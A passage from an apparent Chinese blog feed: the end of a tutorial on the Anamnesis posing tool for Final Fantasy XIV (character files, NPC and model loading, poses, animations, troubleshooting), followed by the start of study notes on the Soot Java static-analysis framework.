0.01，肉眼看起来就是隐形</li><li>子演员：陆行鸟、宠物、时尚配饰，召唤出来后这里就会显示相应的图标</li></ul><p><strong>模型</strong></p><ul><li>数据路径：加载玩家对应的模型<ul><li>修改数据路径后可以使用种族&#x2F;性别特定表情，只能在玩家身上进行。</li></ul></li><li>高度：和身高不同，可以拉得超级大</li><li>湿身：湿身效果</li><li>胸部：调整女号的胸部大小，男号无效</li></ul><p><strong>外貌扩展</strong></p><ul><li>肤色：肤色、光照颜色</li><li>唇色：唇色</li><li>瞳色：左眼、右眼、面妆</li><li>肌肉：数值越大越硬朗（参照人族）</li></ul><p>外貌扩展的颜色选择器：</p><img src="https://s2.loli.net/2022/03/25/KpgI6fm7HokFxuy.jpg" style="zoom:80%;" /><h3 id="加载角色文件"><a href="#加载角色文件" class="headerlink" title="加载角色文件"></a>加载角色文件</h3><p>与常规角色编辑一样，加载角色文件（<code>.chara</code>）必须在进入 GPose 模式前完成，外貌扩展除外。</p><p>首先确保左侧列表中选择了相应的角色，然后点击右下角的载入按钮弹出浮出控件。</p><p>左侧是文件源，包含特定类型文件的预定文件夹，右侧是文件预览。</p><ul><li>Anamnesis 文件夹：包含 <code>.chara</code> 文件</li><li>Final Fantasy XIV 文件夹：包含 <code>.dat</code> 文件</li><li>Concept Matrix Saves 文件夹：包含 <code>.cma</code> 或 <code>.json</code> 文件，自动读取了 CMTool 的文件夹</li><li>Desktop：桌面</li></ul><p>将鼠标悬停在文件夹图标上可以查看路径，也可以保存到预定文件夹之外的文件夹，点击左侧最下方的 <code>...</code> 选择。</p><img src="https://s2.loli.net/2022/03/25/Q7WILtaPHS2Oj3x.jpg" style="zoom:80%;" /><p>最后点击右下的加载按钮加载外观，例如，加载之前在 CMTool 中保存的龙男外貌（捏脸数据大放送x2）：</p><img src="https://s2.loli.net/2022/03/25/nbWcslJxPU6GuKo.jpg" style="zoom:80%;" /><p><strong>注意：</strong>切换副本区就变回原来的模样。</p><h3 id="高级加载选项"><a href="#高级加载选项" class="headerlink" title="高级加载选项"></a>高级加载选项</h3><p>默认情况下，角色的所有属性都被选中，但也可以指定从 <code>.chara</code> 文件中加载的属性。点击载入按钮旁边的 <code>˅</code>，选择要加载的属性：</p><ul><li>外貌：自定义、模型和扩展外观面板中的所有内容</li><li>装备：装备面板中的所有内容</li><li>防具：头部、身体、手部、腿部、脚部</li><li>饰品：耳朵、脖子、手腕、右环、左环</li><li>武器：主手、副手</li></ul><img src="https://s2.loli.net/2022/03/25/eXRhvF9VaZHnpgN.jpg" style="zoom:80%;" /><p>然而，如果文件不包含装备数据，例如 FFXIV 的 <code>.dat</code> 或 Concept Matrix 的 <code>.cma</code> 文件，则只会加载可加载的数据，大多数情况下是外观数据。</p><h3 id="加载-NPC-外观"><a href="#加载-NPC-外观" class="headerlink" title="加载 NPC 外观"></a>加载 NPC 外观</h3><p>有许多 NPC 使用的游戏资产用户无法在游戏中本地访问，但可以用 Anamnesis 装备。根据经验，如果 NPC 的外观可以通过选择特定属性，例如头部网格、面部和服装来手动应用，那么他们可以被视为玩家角色，外观加载与 <code>.chara</code> 文件加载大致相同。一个更基本的看法是，如果 NPC 使用标准的中原之民骨架（<code>middy.json</code>），那么它可以像玩家一样被加载。</p><p>有些 NPC 使用自己的骨架和玩家无法装备的物品，因此被归类为怪物。这些 NPC 包括但不限于：芝诺斯、盖娅、瓦厉斯、沃斯里等。</p><p>加载 NPC 外观只需点击右下角的 NPC 按钮，在弹出的浮出控件中过滤搜索，选择 NPC 进行加载。例如，直接搜索 <code>修特拉</code> 返回多个结果，分别是不同时期的形象，还包括宠物。</p><img src="https://s2.loli.net/2022/03/25/vQNTPsC3XOca7ZL.jpg" style="zoom:80%;" /><p>也可以加载 NPC 外观的指定属性，点击 NPC 按钮旁边的 <code>˅</code> 按钮，选择要加载属性：</p><ul><li>外貌：自定义面板中的任何内容</li><li>装备：装备面板中除主手和副手外的任何东西</li><li>武器：主手、副手</li></ul><img src="https://s2.loli.net/2022/03/25/VpqnG8BzstSol2C.jpg" style="zoom:80%;" /><h3 id="加载外貌扩展"><a href="#加载外貌扩展" class="headerlink" title="加载外貌扩展"></a>加载外貌扩展</h3><p>外貌扩展是 <code>.chara</code> 文件中唯一可以在 GPose 模式中加载的属性。进入 GPose 模式后再加载选定的 <code>.chara</code> 文件即可。</p><h3 id="保存外观"><a href="#保存外观" class="headerlink" title="保存外观"></a>保存外观</h3><p>在 Anamnesis 中角色文件将保存为 <code>.chara</code> 文件格式，默认包含所有外观和装备数据（包括种族、分支），点击右下角的保存按钮弹出浮出控件。</p><p>默认提供两个文件夹作为源，点击 <code>...</code> 选择其他文件夹保存。</p><ul><li>Anamnesis 文件夹</li><li>Desktop：桌面</li></ul><img src="https://s2.loli.net/2022/03/25/xcsqjoUDuvWLbFO.jpg" style="zoom:80%;" /><p><strong>注意：</strong>Anamnesis 不能保存 <code>.cma</code>、 <code>.json</code>、<code>.dat</code> 格式的文件，反过来 CMTool 也不能加载 <code>.chara</code> 文件。</p><h3 id="加载模型"><a href="#加载模型" class="headerlink" title="加载模型"></a>加载模型</h3><p>可以将各种模型加载到选定的演员上，包括 NPC、怪物、宠物和道具等。以下是每个类型的简要说明：</p><ul><li><strong>NPC</strong>：游戏中大部分的命名角色，例如雅·修特拉<ul><li>最好加载到自己的角色或宝石兽上，以免进入 GPose 模式时丢失独特属性，例如，不属于头部网格的特殊纹身、自定义眼睛发光颜色等。</li><li>如果 NPC 使用了玩家可装备的物品，那它们的处理方式与 <code>.chara</code> 文件大致相同。</li></ul></li><li><strong>角色（Character）</strong>：作为 NPC 出现，但实际上在游戏中被视为怪物的角色，例如盖娅</li><li><strong>坐骑（Mount）</strong>：通过各种方式获得的坐骑</li><li><strong>宠物（Minion）</strong>：通过各种方式获得的宠物</li><li><strong>效果（Effect）</strong>：在游戏中作为独立实体出现的敌人效果，通常出现在 Boss 战中</li><li><strong>怪物（Monster）</strong>：主世界的怪物、副本中的怪物、蛮族<ul><li>即基本上不使用人形骨骼的任何模型。</li></ul></li><li><strong>修改（Modded）</strong>：Anamnesis 将通过读取 TexTools 修改列表过滤已被修改的实体</li><li><strong>未知（Unknown）</strong>：尚未正确分类的实体<ul><li>参阅 <a href="https://github.com/imchillin/Anamnesis/wiki/Loading-Models">Contributing to the Model List</a> 获取更多信息。</li></ul></li></ul><p>左侧选择要转换的角色后，点击右下角的载入或 NPC 按钮调出浮出控件，可以在搜索栏按名称搜索，然后选择想要加载的模型。（同加载 NPC 外观的内容）</p><img src="https://s2.loli.net/2022/03/25/vQNTPsC3XOca7ZL.jpg" style="zoom:80%;" /><p><strong>注意：</strong></p><ul><li>GPose 模式中无法加载模型。</li><li>某些模型需要更改类型才能正确显示，通常会自动更改，但有些模型仍需要手动更改类型，并可能需要手动更改某些装备。</li></ul><p>Anamnesis 使用的模型列表是人工维护的，可以查看共享的 <a href="https://docs.google.com/spreadsheets/d/1Z46RPHl0eLsK0gpWhuymefEbe6D15mtx4wbgf0NXSIo/edit#gid=666947796">Google 表格</a>。</p><h2 id="Pose"><a href="#Pose" class="headerlink" title="Pose"></a>Pose</h2><p>操纵角色（演员）的地方，可以从三种动作模式中进行选择：GUI、动作矩阵、Pose 3D，点击右下角的载入可以加载 <code>.pose</code> 文件。</p><div class="tabs" id="动作模式"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#动作模式-1">GUI</button></li><li class="tab"><button type="button" data-href="#动作模式-2">动作矩阵</button></li><li class="tab"><button type="button" data-href="#动作模式-3">Pose 3D</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="动作模式-1"><img src="https://s2.loli.net/2022/03/25/wbCUsQDomtXdT72.jpg" style="zoom:80%;" /><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="动作模式-2"><img src="https://s2.loli.net/2022/03/25/vau3esti4XgjcBV.jpg" style="zoom:80%;" /><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="动作模式-3"><img src="https://s2.loli.net/2022/03/25/ZmUk8QasOow5f7H.jpg" style="zoom:80%;" /><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>Anamnesis 兼容 Concept Matrix 动作文件（<code>.cmp</code>），但 CMTool 用不了 <code>.pose</code> 动作文件。（尚未尝试 <code>.cmp</code> 文件）</p><p>保存动作文件时要确保在用户动作文件夹中，默认情况下，该文件夹位于 <code>文档/Anamnesis</code> 目录中。通过更改设置浮出控件中的路径（点击 <code>...</code>），可以将其更改为任何文件夹。</p><p><strong>注意：</strong>不要将动作文件放入 Anamnesis 程序或 AppData 下的文件夹，尤其是 Built-In Poses 文件夹，因为这些文件夹会在工具更新时被替换，因此用户放入的任何内容都会被删除。</p><img src="https://s2.loli.net/2022/03/25/BGYV6OL7HDl1bNE.jpg" style="zoom:80%;" /><h3 id="加载动作文件"><a href="#加载动作文件" class="headerlink" title="加载动作文件"></a>加载动作文件</h3><p>进入 GPose 模式后，首先暂停人物（全体动作暂停或目标动作暂停），然后手动开启 Posing mode（左上角按钮），人物会被冻结，如果没有暂停人物，那么人物会在原地抖动，暂停动作后可以开始加载动作。</p><ul><li>必须进入 GPose 模式才能加载动作，未进入 GPose 模式时将无法点击按钮。</li><li>进入 GPose 模式后必须暂停人物，否则会出现角色漂移的情况。</li></ul><p><strong>注意：</strong>此时 GPose 模式中的暂停功能不会有边框（选中状态）。</p><img src="https://s2.loli.net/2022/03/25/8qYh4OPCSaxlLeb.jpg" style="zoom:80%;" /><p>左侧选择需要加载动作的角色，进入都动作面板后，点击右下角的载入按钮弹出浮出控件，默认 4 个文件源，包含特定类型文件的预定文件夹：</p><ul><li>Anamnesis Poses 文件夹：包含 <code>.pose</code> 文件</li><li>Anamnesis Built-In Poses 文件夹：内置 <code>.pose</code> 文件，由 <a href="https://github.com/CapnKett">Cap’n Kett</a> 提供</li><li>Concept Matrix Pose (Matrix Saves) 文件夹：包含 <code>.cmp</code> 文件</li><li>Desktop：桌面</li></ul><p>同样，将鼠标悬停在图标上可以看到相应的路径，也可以通过下方的 <code>...</code> 自定义其他文件夹。浮出控件列出了文件夹中的内容，可以通过上方按钮设置显示方式，Anamnesis Built-In Poses 文件夹内置了女性、男性、不分性别的动作。</p><img src="https://s2.loli.net/2022/03/25/Kbl7WGyB2wZuzQ1.jpg" style="zoom:80%;" /><p>选择了动作文件之后点击载入，位置不对可以用右侧的面板调整</p><ul><li>上方是人物面向的 XYZ 轴，也可以拖动圆球的三维调整</li><li>下方是人物模型的 XYZ 轴</li></ul><img src="https://s2.loli.net/2022/03/25/R1Or8TuhzGWDHfI.jpg" style="zoom:80%;" /><h3 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h3><p>进入 GPose 模式前加载动画，可以选择情感动作和表情。（上面那张图的右上部分）</p><ul><li>搜索图标：点击打开情感动作和表情列表</li><li>数字：第一个表示动画 ID，第二个表示循环间隔时间</li><li>暂停图标</li><li>开始图标</li><li><code>Draw Weapon</code> 持有装备；<code>Queue Animation</code> 队列动画，如果只有一个动画则立即开始</li><li><code>Idle Character</code> 恢复待机动作；<code>Reset Animation</code> 收起武器&#x2F;暂停动画</li></ul><img src="https://s2.loli.net/2022/03/25/oe7IFBsMGbuPSVz.jpg" style="zoom:80%;" /><p>加载动画后，可以进入 GPose 模式开启动作循环，然后就可以任意暂停目标动作开始截图了。（什么奇奇怪怪的百万核爆截图😂）</p><img src="https://s2.loli.net/2022/03/25/oq1sMzx8fQdmkVt.jpg" style="zoom:80%;" /><p>游戏中的动画列表可以在 <a href="https://docs.google.com/spreadsheets/d/1nkmqfhP7FZJwmM26o69fq5pgHZsgk9Zvxr0hUUVkL48/edit#gid=526398191">这里</a> 查看。</p><p><strong>TIPS：</strong></p><ol><li>慢速播放：在 GPose 模式中启用睡眠状态，可以将正在执行的动作&#x2F;表情减慢到正常速度的 1&#x2F;4，但只能应用于玩家、同伴和宠物。</li><li>分层动画：先应用一个改变状态的动画，然后再应用一个兼容的动画。例如，先用动画 642 坐下，然后应用上身挥动的动画 681 实现坐着挥手。<ul><li>游戏本身可以实现，还没怎么用过😶</li></ul></li></ol><h1 id="添加额外演员"><a href="#添加额外演员" class="headerlink" title="添加额外演员"></a>添加额外演员</h1><p>可以将各种实体改为额外的演员，而不用借助其他玩家。孤狼玩家的福音（不是</p><h2 id="召唤兽"><a href="#召唤兽" class="headerlink" title="召唤兽"></a>召唤兽</h2><p>最好用宝石兽，其他的缩放比例可能不正确，而且会浮空。最简单的方法是摘掉职业水晶，用秘术师的技能，当然也可以将召唤兽全部替换为宝石兽。</p><p>为了将宝石兽变成可编辑的演员，需要选中宝石兽后，点击 Anamnesis 左侧的 <code>+</code> 按钮添加。</p><img src="https://s2.loli.net/2022/03/25/v6NTMFonid3z8K5.jpg" style="zoom:80%;" /><p>然后可以将外观加载到宝石兽上，点击右下角的加载或 NPC 进行加载。</p><img src="https://s2.loli.net/2022/03/25/RBAhNtMTyiql36j.jpg" style="zoom:80%;" /><p>例如，把雅修特拉加载到宝石兽上。</p><img src="https://s2.loli.net/2022/03/25/2Cic7XlsTUafbYS.jpg" style="zoom:80%;" /><p>转换职业后，会收起宝石兽（自动播放死亡动画）。</p><h2 id="房屋-NPC-或人体模型"><a href="#房屋-NPC-或人体模型" class="headerlink" title="房屋 NPC 或人体模型"></a>房屋 NPC 或人体模型</h2><p>和召唤兽一样，点击 Anamnesis 左侧的 <code>+</code> 按钮添加，然后将外观加载到他们身上。</p><h2 id="陆行鸟"><a href="#陆行鸟" class="headerlink" title="陆行鸟"></a>陆行鸟</h2><p>大致和召唤兽相同，但需要额外在动作选项卡中将每个轴上的比例重置为 1。</p><h2 id="小队成员"><a href="#小队成员" class="headerlink" title="小队成员"></a>小队成员</h2><p>默认情况下，小队成员都被标记为玩家，可以根据需要进行编辑和摆放。</p><h2 id="宠物"><a href="#宠物" class="headerlink" title="宠物"></a>宠物</h2><p>可以转换为 NPC，但是自主行动的会自己跑……</p><img src="https://s2.loli.net/2022/03/25/aUmZj16CNlKfcbW.jpg" style="zoom:80%;" /><h2 id="道具"><a href="#道具" class="headerlink" title="道具"></a>道具</h2><h3 id="游戏资源"><a href="#游戏资源" class="headerlink" title="游戏资源"></a>游戏资源</h3><p>角色（演员）在过场动画中使用的、在情感动作&#x2F;表情中使用的各种道具可在装备部分用作武器的替代。从主手或副手的武器列表中选择相应的道具装备即可。</p><p>道具列表是人工维护的，因此有些道具可能不会出现在列表中。</p><h3 id="已修改的道具"><a href="#已修改的道具" class="headerlink" title="已修改的道具"></a>已修改的道具</h3><p>被 TexTools 修改过的实体。</p><h3 id="时尚配饰"><a href="#时尚配饰" class="headerlink" title="时尚配饰"></a>时尚配饰</h3><p>可以像效果一样加载，但必须手动输入模型 ID。在列表中选择一个角色，然后在角色部分输入相关的模型 ID 手动更改外观。</p><table><thead><tr><th>饰品</th><th>Accessory</th><th>ID</th></tr></thead><tbody><tr><td>阳伞</td><td>Parasol</td><td>2939</td></tr><tr><td>天蓝阳伞</td><td>Sky Blue Parasol</td><td>2940</td></tr><tr><td>红漆油纸伞</td><td>Vermilion Paper Parasol</td><td>3007</td></tr><tr><td>紫漆油纸伞</td><td>Plum Paper Parasol</td><td>3008</td></tr><tr><td>黄漆油纸伞</td><td>Gold Paper Parasol</td><td>3009</td></tr><tr><td>沉稳方格阳伞</td><td>Calming Checkered Parasol</td><td>3010</td></tr><tr><td>活力方格阳伞</td><td>Cheerful Checkered Parasol</td><td>3011</td></tr><tr><td>典雅方格阳伞</td><td>Classy Checkered Parasol</td><td>3012</td></tr><tr><td>天使之翼</td><td>Angel Wings</td><td>3042</td></tr><tr><td>趣味圆点阳伞</td><td>Pleasant Dot Parasol</td><td>3166</td></tr><tr><td>端庄圆点阳伞</td><td>Prim Dot Parasol</td><td>3167</td></tr><tr><td>田园圆点阳伞</td><td>Pastoral Dot Parasol</td><td>3168</td></tr><tr><td>金蝶阳伞</td><td>Gold Parasaucer</td><td>3169</td></tr><tr><td>猫小胖阳伞</td><td>Fat Cat Parasol</td><td>3286</td></tr><tr><td>隆卡的水蛇伞？</td><td>Great Paraserpent</td><td>3287</td></tr><tr><td>红月油纸伞</td><td>Red Moon Parasol</td><td>3288</td></tr></tbody></table><p>例如，将角色转换为阳伞：</p><img src="https://s2.loli.net/2022/03/25/U1gpbmzSMhyserG.jpg" style="zoom:80%;" /><h1 id="pose-动作文件"><a href="#pose-动作文件" class="headerlink" title=".pose 动作文件"></a><code>.pose</code> 动作文件</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>因为 Anamnesis 既支持 <code>.cmp</code> 又支持 <code>.pose</code>，因此可以在 <a href="https://www.xivmodarchive.com/search?sortby=rank&sortorder=desc&nsfw=false&types=11,13">XIV Mod Archive</a> 上按文件格式过滤搜索。</p><img src="https://s2.loli.net/2022/03/25/2CxFVqjkdOEhQ85.png" style="zoom:67%;" /><p>另外，也可以使用 Discord 加入 <a href="https://discord.com/invite/crystallinemeans">Crystalline Means 频道</a>，然后查看并下载 POSE RELEASES 分区中的内容。</p><img src="https://s2.loli.net/2022/03/25/4xvflQbkjDUdG9e.jpg" style="zoom:70%;" /><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ol><li>下载动作：<a href="https://www.xivmodarchive.com/modid/43260">Stronzo Set I</a>（不分性别）</li><li>进入 GPose 模式暂停动作</li><li>开启 Posing mode</li><li>加载 <code>.pose</code> 动作</li><li>按需调整模型 XYZ 轴</li></ol><img src="https://s2.loli.net/2022/03/25/X8WHJ9kAUu6rj1Y.jpg" style="zoom:80%;" /><h1 id="问题与解决"><a href="#问题与解决" class="headerlink" title="问题与解决"></a>问题与解决</h1><ol><li><p><strong>无法启动 Anamnesis</strong></p><p>首先确保安装了 <a href="https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/runtime-desktop-6.0.6-windows-x64-installer">.NET 6.0 Desktop Runtime x64</a> 或更高版本的运行时，如果刚安装需要重启。</p><p>另外，可能是电脑管家给拦截了，可以尝试关闭电脑管家后重启 Anamnesis，或将 Anamnesis 添加到白名单，具体操作根据电脑管家的不同有所出入，请自行搜索相关操作方法。</p><p><code>Failed to initialize Lumina</code> 暂时没有找到具体的解决办法，请在干净的环境下安装对应版本的 Anamnesis。</p></li><li><p><strong>角色不执行动画或原地抖动</strong></p><p>可能的原因有：1. 在 GPose 模式中暂停了人物，或在 Anamnesis 中启用了动作模式；2. 把两个不兼容的动画叠加在一起使用；3. 动画和角色不兼容，有些动画是种族或武器特定的。</p></li><li><p><strong>设置未正确保存，设置文件损坏，或想重置 Anamnesis</strong></p><p>启动 Anamnesis 时按住 <code>Shift</code>，直到出现以下对话窗口：</p><img src="https://s2.loli.net/2022/03/25/7GAByIUQqgfnctY.jpg" style="zoom: 80%;" /></li><li><p><strong>无法在坐骑上摆动作</strong></p><p>看 Wiki 说是只能用第二个角色（演员），将其更改为坐骑。</p></li><li><p><strong>装备无法染色</strong></p><p>有些装备就是不能染色，想改的话请用 TexTools 👉<a href="https://jckling.github.io/2021/04/29/Game/FFXIV/FF14-TexTool%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">FF14 TexTools 使用教程</a></p></li><li><p><strong>退出 GPose 模式后仍然处于冻结状态</strong></p><p>可以尝试关闭 Anamnesis 或切换副本区。</p></li><li><p><strong>没有保存角色数据和动作数据的文件夹</strong></p><p>执行保存操作后才会创建相应的文件夹。</p></li><li><p><strong>人物在 GPose 模式中无法加载动作</strong></p><p>退出 GPose 模式后重新进入，先暂停人物，再开启 Posing mode 加载动作。</p></li><li><p><strong>游戏出错崩溃</strong></p><p>在四人本的时候多次替换上衣，导致游戏崩溃。不建议在副本里频繁使用。</p></li><li><p><strong>加载 NPC 模型后进入 Gpose 显示默认模型</strong><br>   可以加载到宝石兽、陆行鸟上，或加载到角色上再用 CMTool 保存。</p></li></ol><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><ul><li><a href="https://github.com/imchillin/Anamnesis">imchillin&#x2F;Anamnesis</a></li><li><a href="https://github.com/imchillin/Anamnesis/wiki">Anamnesis Wiki</a></li></ul>]]></content>
    
    
    <summary type="html">CMTool 的上位替代工具</summary>
    
    
    
    <category term="Game" scheme="https://jckling.github.io/categories/Game/"/>
    
    
    <category term="FFXIV" scheme="https://jckling.github.io/tags/FFXIV/"/>
    
  </entry>
  
  <entry>
    <title>Soot 使用记录</title>
    <link href="https://jckling.github.io/2022/02/23/Other/Soot%20%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
    <id>https://jckling.github.io/2022/02/23/Other/Soot%20%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</id>
    <published>2022-02-23T11:40:17.000Z</published>
    <updated>2022-06-12T04:28:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为了避免每次都要打开一堆项目回顾，稍微记录一些内容。</p><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><img src="https://s2.loli.net/2022/03/08/wL3laGWBCUg4hmI.jpg" style="zoom: 67%;" /><p>Scene：分析环境</p><ul><li>代表 Soot 输入程序的整个运行、分析、变换的环境。</li></ul><p>SootClass：类</p><ul><li>library 类来自 Soot 的 classpath，但只在需要时加载；</li><li>application 序类是从进程目录中获取的，并且总是被加载和转换；</li><li>phantom 类是既不在进程目录中也不在 Soot 的 classpath 中的类，但它们被 Soot 加载的一些类&#x2F;方法体所引用<ul><li>如果启用了 phantom 类，Soot 不会因为这种无法解决的引用而中止或失败，而是创建一个空的存根，称为 phantom 类，它包含 phantom 方法来弥补缺失的部分。</li></ul></li></ul><p>SootMethod：类中的单个方法</p><img src="https://s2.loli.net/2022/03/08/iBpeRNHVOQh49KX.jpg" style="zoom:25%;" /><p>SootField：类中的单个属性</p><p>Body：方法体</p><ul><li>由 Locals 链（body.getLoclas()）、Units 链（body.getUnits()）、Traps 链（body.getTraps()）组成。</li><li>Locals 链存储方法中的变量定义</li><li>Units 链存储方法中的句子</li><li>Traps 链存储方法中发生异常的语句</li></ul><p>Box：指针</p><ul><li>包括 UnitBox、ValueBox</li><li>一个 Unit 可以有多个 UnitBox，但是每个 UnitBox 只能指向一个 Unit。</li><li>ValueBox 包含在 Unit 中使用的值以及定义的值。</li></ul><p>Stmt 与 Unit 都表示方法中的一个句子。</p><ul><li>Unit 在 Jimple 中的实现是 Stmt</li><li>不同：Unit 注重于句子的构成、而 AssignStmt 之类的则注重句式的种类</li><li>注意：AssignStmt 表示赋值语句；而 IdentityStmt 表示将参数赋值给 Local 这样的语句</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一般 Value 指的是 Local（变量）、Expr（表达式）、Constant（常量）</span></span><br><span class="line"><span class="keyword">public</span> List&lt;ValueBox&gt; <span class="title function_">getUseBoxes</span><span class="params">()</span>;<span class="comment">//返回 Unit 中使用的 Value 的引用</span></span><br><span class="line"><span class="keyword">public</span> List&lt;ValueBox&gt; <span class="title function_">getDefBoxes</span><span class="params">()</span>;<span class="comment">//返回 Unit 中定义的 Value 的引用</span></span><br><span class="line"><span class="keyword">public</span> List&lt;ValueBox&gt; <span class="title function_">getUseAndDefBox</span><span class="params">()</span>;<span class="comment">//返回 Unit 中定义并使用的 Value 的引用</span></span><br><span class="line"><span class="keyword">public</span> List <span class="title function_">geUnitBoxes</span><span class="params">()</span>;<span class="comment">//获得 Unit 跳转到的 UnitxBox 列表</span></span><br><span class="line"><span class="keyword">public</span> List <span class="title function_">getBoxesPointingTothis</span><span class="params">()</span>;<span class="comment">//Unit 作为跳转对象时，获取所有跳转到该 Unit 的 UnitBox</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">fallsThrough</span><span class="params">()</span>;<span class="comment">//如果接下来执行后面的 Unit，则为 true</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">branches</span><span class="params">()</span>;<span class="comment">//如果执行时会跳转到其他 Unit，则返回 true。如：IfStmt、GotoStmt</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rediectJumpsToThisTo</span><span class="params">(Unit newLocation)</span>;<span class="comment">//把跳转到 Unit 重定向到 newLocation</span></span><br></pre></td></tr></table></figure><p>Unit 表示某种用于执行的单元（例如 Jimple 中的 Stmt 和 Baf 中的 Inst）</p><ul><li>Stmt 继承 Unit 接口，AssignStmt、IdentityStmt、IfStmt、RetrunVoidStmt、NopStmt 等继承 Stmt 接口。</li><li>Stmt 子接口</li></ul><p>Block 是划分方法体的基本块，被实现为底层 Body 实例的视图；因此，对 Block 所做的更改将自动反映在其封闭的方法体中。</p><ul><li>Block 存在于 BlockGraph 的上下文中（CFG），图节点是 Block 实例。<ul><li>可以查询后继块和前驱块</li></ul></li></ul><h2 id="执行流"><a href="#执行流" class="headerlink" title="执行流"></a>执行流</h2><p>Soot 执行被分成几个阶段，这些阶段被称为 Packs。</p><ul><li>第一步生成 Jimple 代码，然后将 Jimple 代码输入到其他 Packs 中。<ul><li>通过解析 class、jimple 或 java 文件再通过 Jimple Body（jb）传递它们的结果而完成的。</li></ul></li><li>Soot 根据分析问题是过程内分析还是过程间分析，会有不同的执行流。<ul><li><p>过程内分析简单的说就是被分析的程序中不存在函数调用。</p><img src="https://s2.loli.net/2022/03/08/tvuoyqk5MZnzAPF.jpg" style="zoom:70%;" /></li><li><p>过程间分析简单的说就是存在函数调用。</p><ul><li>过程间分析时，需要指定 Soot 运行在 whole-program 模式下。此时 Soot 会增加三个阶段：cg（call-graph generation）、wjtp（whole Jimple transformation pack）、wjap（whole Jimple annotation pack）</li></ul></li></ul></li></ul><img src="https://s2.loli.net/2022/03/08/yRuiWU3qtgLA7bs.jpg" style="zoom:70%;" /><ul><li>Pack 命名规则：第一个字母表示采用哪种中间语言，例如s（shimple），j（jimple），b（baf），g（grimp）；第二个字母表示进行到 Pack 的哪一步，例如：b（body creation），t（transformation），o（optimizations），a（annotion）；p 表示“pack”，是处理阶段的意思。</li></ul><h2 id="Jimple"><a href="#Jimple" class="headerlink" title="Jimple"></a>Jimple</h2><p>Stmt 类型</p><ul><li>核心语句：NopStmt，DefinitionStmt（Identitystmt，AssignStmt）</li><li>过程内控制流：IfStmt，GotoStmt，TableSwitchStmt，LookupSwitchStmt</li><li>过程间控制流：InvokeStmt，ReturnStmt，ReturnVoidStmt</li><li>监控语句：EnterMonitorStmt，ExistMonitorStmt</li><li>其他类型：ThrowStmt，RetStmt（不再使用）</li></ul><p>Unit 表示某种用于执行的单元（例如 Jimple 中的 Stmt 和 Baf 中的 Inst）</p><ul><li>Stmt 继承 Unit 接口，AssignStmt、IdentityStmt、IfStmt、RetrunVoidStmt、NopStmt 等继承 Stmt 接口。</li><li>Stmt 子接口</li></ul><img src="https://s2.loli.net/2022/03/28/cUWjMXu3klbeLBN.png" style="zoom:80%;" /><p>Block 是划分方法体的基本块，被实现为底层 Body 实例的视图；因此，对 Block 所做的更改将自动反映在其封闭的方法体中。</p><ul><li>Block 存在于 BlockGraph 的上下文中（CFG），图节点是 Block 实例。<ul><li>可以查询后继块和前驱块</li></ul></li></ul><p>每条 Stmt 是一个 Unit，多个 Unit 构成 Block</p><ul><li>Unit 中的跳转信息：控制流</li><li>Unit 中的数据：数据流</li></ul><h2 id="过程内分析"><a href="#过程内分析" class="headerlink" title="过程内分析"></a>过程内分析</h2><p>UnitGraph</p><ul><li>BriefUnitGraph：正常，异常分离。将正常流程与异常处理流程进行了分离，不相交，在最后才汇聚。</li><li>ExceptionalUnitGraph：将正常流程与异常处理流程进行了融合</li><li>TrapUnitGraph：相对于 ExceptionalUnitGraph，一些普通的语句也会跳转到异常流程中。<ul><li>即认为 try 中包含的所有的语句都有可能触发异常</li></ul></li><li>EnhancedUnitGraph：异常流在 try-catch-finally 块级别而不是 Unit 级别表示</li></ul><img src="https://s2.loli.net/2022/03/28/uOFZsUvJfWkwcMR.png" style="zoom:80%;" /><p>BlockGraph </p><ul><li>BriefBlockGraph：与异常相关的控制流被忽略，因此图将是一个森林，其中每个异常处理程序构成一个不相交的子图。</li><li>ExceptionalBlockGraph：考虑与异常相关的控制流：当一个 Unit 可能抛出一个被 Body 内的 Trap 捕获的异常时，异常 Unit 创建一个新的基本块。<ul><li>当 Unit 可能抛出的所有异常都将逃脱方法而未被捕获时，不会创建新块</li></ul></li><li>ClassicCompleteBlockGraph：考虑与异常相关的控制流，当一个 Unit 可能抛出一个被 Body 内的 Trap 捕获的异常时，异常 Unit 会创建一个新的基本块。仅用于测试，不应用于实际分析。</li><li>ArrayRefBlockGraph：节点是 Block 实例，其中包含数组引用的 Unit 将创建新块。异常控制流被忽略，因此图将是一个森林，其中每个异常处理程序构成一个不相交的子图。</li><li>ZonedBlockGraph：节点是 Block 实例，并且在为提供的 Body 查找 Block 时会考虑异常边界。<ul><li>任何作为第一个被某个异常处理程序转换的 Unit 都将创建一个新块，任何作为最后一个被某个异常处理程序覆盖的单元，都将结束它所属的块。然而，这些 Zone 并没有被分割以表明异常可能导致控制在完成之前退出该区域。</li></ul></li><li>EnhancedBlockGraph</li></ul><img 